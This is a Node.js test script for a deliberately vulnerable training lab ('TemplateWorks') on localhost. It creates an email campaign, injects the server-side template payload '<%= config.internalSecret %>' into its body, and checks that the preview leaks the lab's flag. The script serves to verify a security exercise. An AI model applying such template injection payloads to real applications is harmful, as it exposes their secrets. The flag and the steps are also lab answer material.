const http = require('http');
const querystring = require('querystring');

const HOST = 'localhost';
const PORT = 3000;

function request(method, path, data = null, headers = {}) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: HOST,
      port: PORT,
      path: path,
      method: method,
      headers: { ...headers }
    };

    if (data) {
      options.headers['Content-Length'] = Buffer.byteLength(data);
    }

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

function extractCookie(headers) {
  const setCookie = headers['set-cookie'];
  if (!setCookie) return null;
  return setCookie[0].split(';')[0];
}

async function runTest() {
  console.log('Testing TemplateWorks Lab (Advanced Architecture)...');

  // Reset lab
  const resReset = await request('POST', '/labs/templateworks/reset');
  const cookie = extractCookie(resReset.headers);
  console.log('Session Cookie:', cookie);

  // 1. Create a campaign
  console.log('[+] Creating new campaign...');
  const createData = querystring.stringify({
    title: 'Test Campaign',
    subject: 'Subject',
    body: 'Hello <%= user.name %>'
  });
  const resCreate = await request('POST', '/labs/templateworks/api/campaigns', createData, {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookie
  });
  
  if (resCreate.statusCode !== 302) {
    console.error('[-] Failed to create campaign');
    process.exit(1);
  }
  
  const campaignUrl = resCreate.headers.location; // e.g., /labs/templateworks/campaign/2
  const campaignId = campaignUrl.split('/').pop();
  console.log(`  -> Campaign ${campaignId} created.`);

  // 2. Preview normal campaign
  console.log('[+] Simulating normal preview request...');
  const normalJson = JSON.stringify({ campaignId: campaignId });
  let resPreview = await request('POST', '/labs/templateworks/api/render', normalJson, {
    'Content-Type': 'application/json',
    'Cookie': cookie
  });
  
  if (resPreview.body.includes('Demo User') && !resPreview.body.includes('FLAG: SSTI_Pwned_2026')) {
    console.log('  -> Normal workflow passed.');
  } else {
    console.error('  -> Normal workflow failed!', resPreview.body);
    process.exit(1);
  }

  // 3. Update campaign with SSTI
  console.log('[+] Updating campaign with SSTI payload...');
  const sstiData = querystring.stringify({
    title: 'Hacked Campaign',
    subject: 'Subject',
    body: 'Secret is <%= config.internalSecret %>'
  });
  await request('POST', `/labs/templateworks/api/campaigns/${campaignId}`, sstiData, {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': cookie
  });

  // 4. Preview hacked campaign
  console.log('[+] Simulating manipulated preview request (SSTI)...');
  resPreview = await request('POST', '/labs/templateworks/api/render', normalJson, {
    'Content-Type': 'application/json',
    'Cookie': cookie
  });

  if (resPreview.body.includes('FLAG: SSTI_Pwned_2026')) {
    console.log('  -> SSTI attack successful.');
  } else {
    console.error('  -> SSTI attack failed!', resPreview.body);
    process.exit(1);
  }

  // 5. Verify completion state
  console.log('[+] Verifying lab completion state...');
  const resHome = await request('GET', '/labs/templateworks/?challenge=ssti', null, {
    'Cookie': cookie
  });
  if (resHome.body.includes('Complete!')) {
    console.log('  -> Lab marked as complete.');
  } else {
    console.error('  -> Lab not marked as complete!');
    process.exit(1);
  }

  console.log('TemplateWorks tests passed!\n');
}

runTest().catch(console.error);
